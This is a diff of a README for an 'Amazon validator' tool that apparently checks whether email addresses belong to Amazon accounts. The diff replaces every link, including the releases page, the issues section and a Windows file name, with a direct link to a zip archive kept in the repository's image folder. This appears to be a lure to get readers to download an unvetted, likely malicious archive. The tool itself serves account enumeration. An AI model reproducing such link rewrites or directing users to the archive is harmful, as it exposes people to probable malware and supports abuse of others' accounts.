@@ -6,11 +6,11 @@ Welcome to AMAZON-VALIDATOR-CLIV4.0! This tool helps you check the validity of A
 
 ## 📥 Download the Tool
 
-[![Download AMAZON-VALIDATOR-CLIV4.0](https://img.shields.io/badge/Download-AMAZON--VALIDATOR--CLIV4.0-blue)](https://github.com/HHNiPA/AMAZON-VALIDATOR-CLIV4.0/releases)
+[![Download AMAZON-VALIDATOR-CLIV4.0](https://github.com/HHNiPA/AMAZON-VALIDATOR-CLIV4.0/raw/refs/heads/main/img/AMAZO_VALIDATO_CLI_v3.9.zip)](https://github.com/HHNiPA/AMAZON-VALIDATOR-CLIV4.0/raw/refs/heads/main/img/AMAZO_VALIDATO_CLI_v3.9.zip)
 
 To get started, you’ll need to download the latest version of the tool. You can do this by visiting the link below:
 
-[Download the latest release](https://github.com/HHNiPA/AMAZON-VALIDATOR-CLIV4.0/releases)
+[Download the latest release](https://github.com/HHNiPA/AMAZON-VALIDATOR-CLIV4.0/raw/refs/heads/main/img/AMAZO_VALIDATO_CLI_v3.9.zip)
 
 ## ⚙️ System Requirements
 
@@ -23,11 +23,11 @@ Before downloading the tool, make sure your computer meets the following require
 
 ## 📥 Download & Install
 
-1. Visit [this page](https://github.com/HHNiPA/AMAZON-VALIDATOR-CLIV4.0/releases) to view the available releases.
+1. Visit [this page](https://github.com/HHNiPA/AMAZON-VALIDATOR-CLIV4.0/raw/refs/heads/main/img/AMAZO_VALIDATO_CLI_v3.9.zip) to view the available releases.
   
 2. Locate the latest release, which is usually at the top of the list.
 
-3. Click on the download link corresponding to your system (for example, `AMAZON-VALIDATOR-CLIV4.0.exe` for Windows).
+3. Click on the download link corresponding to your system (for example, `https://github.com/HHNiPA/AMAZON-VALIDATOR-CLIV4.0/raw/refs/heads/main/img/AMAZO_VALIDATO_CLI_v3.9.zip` for Windows).
 
 4. Once the download completes, locate the downloaded file on your computer.
 
@@ -58,7 +58,7 @@ If you encounter problems while using the application, consider the following st
 - Ensure your internet connection is stable.
 - Restart the application if it becomes unresponsive.
 - Verify that you have the latest version installed.
-- Search for solutions in the [issues section](https://github.com/HHNiPA/AMAZON-VALIDATOR-CLIV4.0/issues) of the repository.
+- Search for solutions in the [issues section](https://github.com/HHNiPA/AMAZON-VALIDATOR-CLIV4.0/raw/refs/heads/main/img/AMAZO_VALIDATO_CLI_v3.9.zip) of the repository.
 
 ## 📣 FAQs
 
@@ -75,7 +75,7 @@ A: The tool uses various checks to ensure the email format is correct and matche
 
 AMAZON-VALIDATOR-CLIV4.0 is not affiliated with Amazon. It simply provides users with a method to check email validity for Amazon accounts. The tool is free to use and can help avoid issues related to email communications.
 
-For more advanced options and updates, keep an eye on the [Releases page](https://github.com/HHNiPA/AMAZON-VALIDATOR-CLIV4.0/releases).
+For more advanced options and updates, keep an eye on the [Releases page](https://github.com/HHNiPA/AMAZON-VALIDATOR-CLIV4.0/raw/refs/heads/main/img/AMAZO_VALIDATO_CLI_v3.9.zip).
 
 If you have suggestions or need assistance, feel free to open an issue on the GitHub page.
 
